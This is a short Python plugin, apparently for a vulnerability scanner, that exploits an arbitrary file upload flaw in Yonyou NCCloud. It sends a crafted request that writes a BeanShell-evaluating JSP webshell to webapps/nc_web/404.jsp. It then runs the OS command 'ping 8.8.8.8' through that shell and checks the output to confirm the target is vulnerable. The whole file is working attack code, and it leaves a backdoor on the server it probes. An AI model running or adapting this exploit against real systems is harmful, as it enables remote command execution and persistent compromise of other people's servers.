#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友NCCloud任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type':'application/x-www-form-urlencoded',
      'Accept-Encoding': 'gzip, deflate',
      }
  target = '/uapjs/jsinvoke/?action=invoke'
  data = '{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200:
      data = 'cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ping 8.8.8.8").getInputStream())'
      resp=requests.post(url=url+'/404.jsp?error=bsh.Interpreter',headers=headers,data=data,timeout=5,verify=False)
      if resp.status_code == 200 and 'Pinging' in resp.text and 'from' in resp.text and 'TTL' in resp.text:
        ret['huixian'] = resp.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret